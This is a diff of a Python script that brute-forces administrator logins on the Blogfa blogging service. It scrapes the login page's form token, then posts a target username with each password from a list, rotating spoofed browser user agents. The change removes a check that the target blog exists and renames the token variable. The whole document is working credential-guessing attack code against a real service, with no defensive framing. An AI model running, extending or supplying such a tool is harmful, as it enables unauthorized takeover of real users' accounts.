@@ -36,14 +36,6 @@ print (f"{lrd}---------------------------------------")
 TARGET = input(f"{lrd}[{yw}URL{lrd}] Enter url TARGET : {lgn}")
 print (f"{yw}-----------------------------------")
 
-check_web = ('http://'+TARGET+'.blogfa.com')
-check_web = get(check_web)
-if check_web.status_code == 404:
-    print (f'{yw}Not Page ! : {lrd}',TARGET)
-    sys.exit()
-else:
-    pass
-
 user_agent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -89,12 +81,12 @@ blogfA = get('https://blogfa.com/desktop/login.aspx')
 Infoo = (blogfA).text
 info = BeautifulSoup(Infoo, 'html.parser')
 
-t_t = info.find('input')['value']
+tok = info.find('input')['value']
 
 
 for ent_pas in pas:
     
-    payload = {"_tt":t_t,
+    payload = {"_tt":tok,
 "usrid":TARGET,
 "ups":ent_pas,
 "btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}
